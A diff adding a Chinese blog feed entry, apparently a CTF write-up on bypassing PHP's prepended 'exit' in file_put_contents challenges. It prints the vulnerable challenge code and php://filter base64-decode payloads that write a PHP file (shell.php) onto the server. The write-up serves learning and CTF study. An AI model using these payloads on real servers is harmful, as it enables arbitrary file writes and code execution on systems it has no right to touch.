@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>浅谈CTF中代码审计PHP死亡退出</title>
+      <link href="/posts/bb2a675e/"/>
+      <url>/posts/bb2a675e/</url>
+      
+        <content type="html"><![CDATA[<p>前言：遇到一个代码审计的题目，略有思考。记录一下~<br>源码就是这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$content = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line">$content .= $_POST[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">file_put_contents($_POST[<span class="string">&#x27;filename&#x27;</span>], $content);</span><br></pre></td></tr></table></figure><p><code>.=</code>就是拼接。前面的<code>$content</code>已经给了<code>&lt;?php exit; ?&gt;</code>，所以说不管后面是什么，都会先执行退出。导致后面的语句不执行。这也叫PHP死亡退出。<br>P神的讲解<br><img src="https://img-blog.csdnimg.cn/20201024210717645.png#pic_center" alt="m0re" loading="lazy"><br>实战中会比较多的在缓存和配置文件里。<br>绕过其实也很简单，POST方式提交了参数，这个是可控的，所以尝试PHP伪协议来进行写入一句话，并且使用base64-decode去除死亡退出。</p><ul><li>利用<code>php://filter</code>流的<code>base64_decode</code>函数特性去除死亡exit</li><li>base64编码中只包含64个可打印字符，在解码的时候，遇到这64个之外的字符，就会略过</li><li><code>&lt;?php exit; ?&gt;</code>这条代码base64解码时，会解码为<code>phpexit</code></li><li>base64解码是四个byte一组，所以再增加一个字符，凑够两组，后面的就会正常解码</li></ul><p>在本地进行实验<br><img src="https://img-blog.csdnimg.cn/20201024212320145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.base64-decode/resource=shell.php&amp;data=aPD9waHAgcGhwaW5mbygpOyA/Pg</span></span><br></pre></td></tr></table></figure><p>查看网站目录成功写入<br><img src="https://img-blog.csdnimg.cn/20201024213115228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>内容是<img src="https://img-blog.csdnimg.cn/20201024213139495.png#pic_center" alt="m0re" loading="lazy"><br>可以看到已经绕过了exit。直接执行我写入的PHP语句了。<br><img src="https://img-blog.csdnimg.cn/20201024213310164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>自己的理解：原本不管写入什么都是拼接在<code>&lt;?php exit;?&gt;</code>后面的，像这样<br><img src="https://img-blog.csdnimg.cn/20201024222331788.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>执行一下是什么都没有。<br><img src="https://img-blog.csdnimg.cn/20201024222419633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>因为先执行了<code>exit</code>退出了。<br>还有今天下午的慕测平台的软件测试大赛，比较菜就做出来两个，一个是git泄露，一个是文件上传。第一题跟这个类似。<br>源码是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$filename = $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">$data = <span class="string">&#x27;&lt;?php exit();?&gt; &#x27;</span> . $filename;</span><br><span class="line">file_put_contents($filename,$data);</span><br></pre></td></tr></table></figure><p>这个题，可能是运维师傅给的权限太高了，直接将写权限给出来了，就有人搅屎，把index.php给删了。然后网站就访问不了了。<br>解题过程中这个没想明白的是<code>$_REQUEST</code>虽然是集合get和post的请求方式，但是这个两个都是request，就有点难以理解。我进行复现时是这样的。<br><img src="https://img-blog.csdnimg.cn/20201024223703715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>就会有报错，内容是，<code>file_put_contents()</code>需要两个参数，而此请求只提供了一个。<br>所以无法成功执行。<br>还有就是如果使用<code>base64-decode</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/write=convert.base64-decode/resource=shell.php&amp;file=aPD9waHAgZmlsZV9nZXRfY29udGVudHMoImZsYWcucGhwIikgPz4=</span><br></pre></td></tr></table></figure><p>是可以成功写入，但是写入的是这样的。而且文件名也是base64编码。无法利用。</p><p><img src="https://img-blog.csdnimg.cn/20201024225602550.png#pic_center" alt="m0re" loading="lazy"><br>目前思路卡在这里。不知道有没有wp，或者回头问问其他师傅们。<br>看到的师傅们如果了解还请指点一下，感谢！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安学习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> PHP </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>CTF题记—一些思考</title>
       <link href="/posts/37b33e9e/"/>
       <url>/posts/37b33e9e/</url>
